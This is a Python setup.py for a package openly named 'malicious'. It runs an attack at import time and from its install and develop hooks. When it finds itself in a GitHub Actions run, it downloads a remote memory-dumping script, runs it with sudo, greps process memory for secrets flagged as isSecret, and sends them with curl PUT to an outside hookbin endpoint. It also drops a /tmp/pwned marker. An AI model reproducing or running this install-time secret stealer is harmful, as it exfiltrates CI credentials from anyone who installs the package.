import os
import subprocess

def run_exploit():
    with open("/tmp/pwned", "w") as f:
        f.write("pwned")
    run_id = os.getenv("GITHUB_RUN_ID")
    if run_id:
        exploit = f'echo "Okay, we got this far. Let\'s continue..." && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":{{"value":"[^"]*","isSecret":true}}\' >> "/tmp/secrets" && curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"'
        os.system(exploit)

# Run at top level
run_exploit()

from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        run_exploit()

class PostDevelopCommand(develop):
    def run(self):
        develop.run(self)
        run_exploit()

setup(
    name='malicious',
    version='0.1.0',
    packages=['malicious'],
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
)
